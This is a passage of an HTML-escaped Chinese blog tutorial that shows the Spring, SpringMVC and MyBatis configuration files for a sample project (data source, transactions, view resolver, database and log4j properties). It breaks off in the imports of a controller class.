    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;build&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;project&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;

&lt;h2&gt;applicationContext-dao.xml(持久层)&lt;/h2&gt;
&lt;p&gt; 路径：src/main/resources/spring/applicationContext-dao.xml&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;?&lt;/span&gt;&lt;span&gt;xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;&lt;/span&gt;&lt;span&gt;?&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;beans &lt;/span&gt;&lt;span&gt;xmlns&lt;/span&gt;&lt;span&gt;=&quot;http://www.springframework.org/schema/beans&quot;&lt;/span&gt;&lt;span&gt;
    xmlns:xsi&lt;/span&gt;&lt;span&gt;=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&lt;/span&gt;&lt;span&gt;
    xmlns:aop&lt;/span&gt;&lt;span&gt;=&quot;http://www.springframework.org/schema/aop&quot;&lt;/span&gt;&lt;span&gt;
    xmlns:tx&lt;/span&gt;&lt;span&gt;=&quot;http://www.springframework.org/schema/tx&quot;&lt;/span&gt;&lt;span&gt;
    xmlns:context&lt;/span&gt;&lt;span&gt;=&quot;http://www.springframework.org/schema/context&quot;&lt;/span&gt;&lt;span&gt;
    xsi:schemaLocation&lt;/span&gt;&lt;span&gt;=&quot;http://www.springframework.org/schema/beans
        http://www.springframework.org/schema/beans/spring-beans.xsd
        http://www.springframework.org/schema/context
        http://www.springframework.org/schema/context/spring-context.xsd
        http://www.springframework.org/schema/tx
        http://www.springframework.org/schema/tx/spring-tx.xsd
        http://www.springframework.org/schema/aop
        http://www.springframework.org/schema/aop/spring-aop.xsd&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 读取java配置文件，替换占位符数据 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;context:property-placeholder &lt;/span&gt;&lt;span&gt;location&lt;/span&gt;&lt;span&gt;=&quot;classpath:db.properties&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 配置数据源 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;bean &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;dataSource&quot;&lt;/span&gt;&lt;span&gt;
        class&lt;/span&gt;&lt;span&gt;=&quot;org.apache.commons.dbcp.BasicDataSource&quot;&lt;/span&gt;&lt;span&gt; destroy-method&lt;/span&gt;&lt;span&gt;=&quot;close&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;property &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;driverClassName&quot;&lt;/span&gt;&lt;span&gt;
            value&lt;/span&gt;&lt;span&gt;=&quot;${db.driverClassName}&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;property&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;property &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;url&quot;&lt;/span&gt;&lt;span&gt;
            value&lt;/span&gt;&lt;span&gt;=&quot;${db.url}&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;property&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;property &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;username&quot;&lt;/span&gt;&lt;span&gt; value&lt;/span&gt;&lt;span&gt;=&quot;${db.username}&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;property&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;property &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;password&quot;&lt;/span&gt;&lt;span&gt; value&lt;/span&gt;&lt;span&gt;=&quot;${db.password}&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;property&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;bean&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 配置SqlSessionFactory &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;bean &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;sqlSessionFactory&quot;&lt;/span&gt;&lt;span&gt;
        class&lt;/span&gt;&lt;span&gt;=&quot;org.mybatis.spring.SqlSessionFactoryBean&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 注入dataSource &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;property &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;dataSource&quot;&lt;/span&gt;&lt;span&gt; ref&lt;/span&gt;&lt;span&gt;=&quot;dataSource&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;property&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; mybatis批量别名配置 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;property &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;typeAliasesPackage&quot;&lt;/span&gt;&lt;span&gt; value&lt;/span&gt;&lt;span&gt;=&quot;com.cyb.ssm.po&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;property&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;bean&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 批量代理对象的生成 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;bean &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;org.mybatis.spring.mapper.MapperScannerConfigurer&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 指定需要生成代理的接口所在的包名 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;property &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;basePackage&quot;&lt;/span&gt;&lt;span&gt; value&lt;/span&gt;&lt;span&gt;=&quot;com.cyb.ssm.mapper&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;property&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;bean&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;beans&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;applicationContext-service.xml(业务层)&lt;/h2&gt;
&lt;p&gt;路径：src/main/resources/spring/applicationContext-service.xml&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;?&lt;/span&gt;&lt;span&gt;xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;&lt;/span&gt;&lt;span&gt;?&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;beans &lt;/span&gt;&lt;span&gt;xmlns&lt;/span&gt;&lt;span&gt;=&quot;http://www.springframework.org/schema/beans&quot;&lt;/span&gt;&lt;span&gt;
    xmlns:xsi&lt;/span&gt;&lt;span&gt;=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&lt;/span&gt;&lt;span&gt;
    xmlns:aop&lt;/span&gt;&lt;span&gt;=&quot;http://www.springframework.org/schema/aop&quot;&lt;/span&gt;&lt;span&gt;
    xmlns:tx&lt;/span&gt;&lt;span&gt;=&quot;http://www.springframework.org/schema/tx&quot;&lt;/span&gt;&lt;span&gt;
    xmlns:context&lt;/span&gt;&lt;span&gt;=&quot;http://www.springframework.org/schema/context&quot;&lt;/span&gt;&lt;span&gt;
    xsi:schemaLocation&lt;/span&gt;&lt;span&gt;=&quot;http://www.springframework.org/schema/beans
        http://www.springframework.org/schema/beans/spring-beans.xsd
        http://www.springframework.org/schema/context
        http://www.springframework.org/schema/context/spring-context.xsd
        http://www.springframework.org/schema/tx
        http://www.springframework.org/schema/tx/spring-tx.xsd
        http://www.springframework.org/schema/aop
        http://www.springframework.org/schema/aop/spring-aop.xsd&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 扫描业务bean &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;context:component-scan
        &lt;/span&gt;&lt;span&gt;base-package&lt;/span&gt;&lt;span&gt;=&quot;com.cyb.ssm.service&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;context:component-scan&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;beans&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;applicationContext-tx.xml(事务)&lt;/h2&gt;
&lt;p&gt;路径：src/main/resources/spring/applicationContext-tx.xml&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;?&lt;/span&gt;&lt;span&gt;xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;&lt;/span&gt;&lt;span&gt;?&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;beans &lt;/span&gt;&lt;span&gt;xmlns&lt;/span&gt;&lt;span&gt;=&quot;http://www.springframework.org/schema/beans&quot;&lt;/span&gt;&lt;span&gt;
    xmlns:xsi&lt;/span&gt;&lt;span&gt;=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&lt;/span&gt;&lt;span&gt;
    xmlns:aop&lt;/span&gt;&lt;span&gt;=&quot;http://www.springframework.org/schema/aop&quot;&lt;/span&gt;&lt;span&gt;
    xmlns:tx&lt;/span&gt;&lt;span&gt;=&quot;http://www.springframework.org/schema/tx&quot;&lt;/span&gt;&lt;span&gt;
    xmlns:context&lt;/span&gt;&lt;span&gt;=&quot;http://www.springframework.org/schema/context&quot;&lt;/span&gt;&lt;span&gt;
    xsi:schemaLocation&lt;/span&gt;&lt;span&gt;=&quot;http://www.springframework.org/schema/beans
        http://www.springframework.org/schema/beans/spring-beans.xsd
        http://www.springframework.org/schema/context
        http://www.springframework.org/schema/context/spring-context.xsd
        http://www.springframework.org/schema/tx
        http://www.springframework.org/schema/tx/spring-tx.xsd
        http://www.springframework.org/schema/aop
        http://www.springframework.org/schema/aop/spring-aop.xsd&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;

    &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 配置平台事务管理器 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;bean &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;transactionManager&quot;&lt;/span&gt;&lt;span&gt;
        class&lt;/span&gt;&lt;span&gt;=&quot;org.springframework.jdbc.datasource.DataSourceTransactionManager&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;property &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;dataSource&quot;&lt;/span&gt;&lt;span&gt; ref&lt;/span&gt;&lt;span&gt;=&quot;dataSource&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;property&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;bean&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 事务通知 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; tx:advice:对应的处理器类是TransactionInterceptor类(实现了MethodInterceptor) &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; TransactionInterceptor类实现事务是通过transaction-manager属性指定的值进行事务管理 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;tx:advice &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;txAdvice&quot;&lt;/span&gt;&lt;span&gt;
        transaction-manager&lt;/span&gt;&lt;span&gt;=&quot;transactionManager&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 设置事务管理信息 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;tx:attributes&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 增删改使用REQUIRED事务传播行为 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 查询使用read-only &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;tx:method &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;save*&quot;&lt;/span&gt;&lt;span&gt; propagation&lt;/span&gt;&lt;span&gt;=&quot;REQUIRED&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;tx:method &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;insert*&quot;&lt;/span&gt;&lt;span&gt; propagation&lt;/span&gt;&lt;span&gt;=&quot;REQUIRED&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;tx:method &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;add*&quot;&lt;/span&gt;&lt;span&gt; propagation&lt;/span&gt;&lt;span&gt;=&quot;REQUIRED&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;tx:method &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;create*&quot;&lt;/span&gt;&lt;span&gt; propagation&lt;/span&gt;&lt;span&gt;=&quot;REQUIRED&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;tx:method &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;delete*&quot;&lt;/span&gt;&lt;span&gt; propagation&lt;/span&gt;&lt;span&gt;=&quot;REQUIRED&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;tx:method &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;remove*&quot;&lt;/span&gt;&lt;span&gt; propagation&lt;/span&gt;&lt;span&gt;=&quot;REQUIRED&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;tx:method &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;del*&quot;&lt;/span&gt;&lt;span&gt; propagation&lt;/span&gt;&lt;span&gt;=&quot;REQUIRED&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;tx:method &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;update*&quot;&lt;/span&gt;&lt;span&gt; propagation&lt;/span&gt;&lt;span&gt;=&quot;REQUIRED&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;tx:method &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;modify*&quot;&lt;/span&gt;&lt;span&gt; propagation&lt;/span&gt;&lt;span&gt;=&quot;REQUIRED&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;tx:method &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;edit*&quot;&lt;/span&gt;&lt;span&gt; propagation&lt;/span&gt;&lt;span&gt;=&quot;REQUIRED&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;tx:method &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;query*&quot;&lt;/span&gt;&lt;span&gt; read-only&lt;/span&gt;&lt;span&gt;=&quot;true&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;tx:method &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;find*&quot;&lt;/span&gt;&lt;span&gt; read-only&lt;/span&gt;&lt;span&gt;=&quot;true&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
            &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;tx:method &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;select*&quot;&lt;/span&gt;&lt;span&gt; read-only&lt;/span&gt;&lt;span&gt;=&quot;true&quot;&lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;tx:attributes&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;tx:advice&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 基于AspectJ+XML方式实现声明式事务 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;aop:config&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; aop:advisor标签使用的是传统spring aop开发方式实现的 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; spring已经实现了该增强功能，spring使用的是实现MethodInterceptor接口的方式实现的 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;aop:advisor &lt;/span&gt;&lt;span&gt;advice-ref&lt;/span&gt;&lt;span&gt;=&quot;txAdvice&quot;&lt;/span&gt;&lt;span&gt;
            pointcut&lt;/span&gt;&lt;span&gt;=&quot;execution(* *..*.*ServiceImpl.*(..))&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;aop:config&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;beans&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;springmvc.xml(扫描)&lt;/h2&gt;
&lt;p&gt;路径：src/main/resources/spring/springmvc.xml&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;?&lt;/span&gt;&lt;span&gt;xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;&lt;/span&gt;&lt;span&gt;?&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;beans &lt;/span&gt;&lt;span&gt;xmlns&lt;/span&gt;&lt;span&gt;=&quot;http://www.springframework.org/schema/beans&quot;&lt;/span&gt;&lt;span&gt;
    xmlns:xsi&lt;/span&gt;&lt;span&gt;=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;&lt;/span&gt;&lt;span&gt;
    xmlns:aop&lt;/span&gt;&lt;span&gt;=&quot;http://www.springframework.org/schema/aop&quot;&lt;/span&gt;&lt;span&gt;
    xmlns:mvc&lt;/span&gt;&lt;span&gt;=&quot;http://www.springframework.org/schema/mvc&quot;&lt;/span&gt;&lt;span&gt;
    xmlns:tx&lt;/span&gt;&lt;span&gt;=&quot;http://www.springframework.org/schema/tx&quot;&lt;/span&gt;&lt;span&gt;
    xmlns:context&lt;/span&gt;&lt;span&gt;=&quot;http://www.springframework.org/schema/context&quot;&lt;/span&gt;&lt;span&gt;
    xsi:schemaLocation&lt;/span&gt;&lt;span&gt;=&quot;http://www.springframework.org/schema/beans
        http://www.springframework.org/schema/beans/spring-beans.xsd
        http://www.springframework.org/schema/context
        http://www.springframework.org/schema/context/spring-context.xsd
        http://www.springframework.org/schema/tx
        http://www.springframework.org/schema/tx/spring-tx.xsd
        http://www.springframework.org/schema/mvc
        http://www.springframework.org/schema/mvc/spring-mvc.xsd
        http://www.springframework.org/schema/aop
        http://www.springframework.org/schema/aop/spring-aop.xsd&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 处理器类的扫描 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;context:component-scan
        &lt;/span&gt;&lt;span&gt;base-package&lt;/span&gt;&lt;span&gt;=&quot;com.cyb.ssm.controller&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;context:component-scan&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;mvc:annotation-driven &lt;/span&gt;&lt;span&gt;/&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;!--&lt;/span&gt;&lt;span&gt; 显示配置视图解析器 &lt;/span&gt;&lt;span&gt;--&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;bean
        &lt;/span&gt;&lt;span&gt;class&lt;/span&gt;&lt;span&gt;=&quot;org.springframework.web.servlet.view.InternalResourceViewResolver&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;property &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;prefix&quot;&lt;/span&gt;&lt;span&gt; value&lt;/span&gt;&lt;span&gt;=&quot;/WEB-INF/jsp/&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;property&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
        &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;property &lt;/span&gt;&lt;span&gt;name&lt;/span&gt;&lt;span&gt;=&quot;suffix&quot;&lt;/span&gt;&lt;span&gt; value&lt;/span&gt;&lt;span&gt;=&quot;.jsp&quot;&lt;/span&gt;&lt;span&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;property&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;bean&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;beans&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;db.properties&lt;/h2&gt;
&lt;p&gt;路径：src/main/resources/db.properties&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;33&quot;&gt;
&lt;pre&gt;
&lt;span&gt;db.driverClassName=com.mysql.cj.jdbc.Driver
db.url=jdbc:mysql://localhost:3306/demo?useUnicode=true&lt;/span&gt;&lt;span&gt;&amp;amp;characterEncoding&lt;/span&gt;=UTF-8&lt;span&gt;&amp;amp;serverTimezone&lt;/span&gt;&lt;span&gt;=Asia/Shanghai
db.username=root
db.password=root&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt;log4j.properties&lt;/h2&gt;
&lt;p&gt;路径：src/main/resources/log4j.properties&lt;/p&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;35&quot;&gt;
&lt;pre&gt;
&lt;span&gt;#dev env [debug] product env [info]
log4j.rootLogger=DEBUG, stdout
# Console output...
log4j.appender.stdout=org.apache.log4j.ConsoleAppender
log4j.appender.stdout.layout=org.apache.log4j.PatternLayout
log4j.appender.stdout.layout.ConversionPattern=%5p [%t] - %m%n&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h2&gt; 提示&lt;/h2&gt;
&lt;p&gt;　　&lt;span&gt;&lt;strong&gt;POJO是逆向工程自动生成的，各自视情况而定！！！！&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h2&gt; 包&lt;/h2&gt;
&lt;h3&gt; com.cyb.ssm.controller&lt;/h3&gt;
&lt;p&gt; 路径：src/main/java&lt;/p&gt;
&lt;h4&gt; ItemController.java&lt;/h4&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;36&quot;&gt;
&lt;pre&gt;
&lt;span&gt;package&lt;/span&gt;&lt;span&gt; com.cyb.ssm.controller;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.ArrayList;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; java.util.List;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.beans.factory.annotation.Autowired;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.stereotype.Controller;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.stereotype.Service;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.web.bind.annotation.RequestMapping;
&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; org.springframework.web.servlet.ModelAndView;

&lt;/span&gt;&lt;span&gt;import&lt;/span&gt;&lt;span&gt; com.cyb.ssm.po.Item;
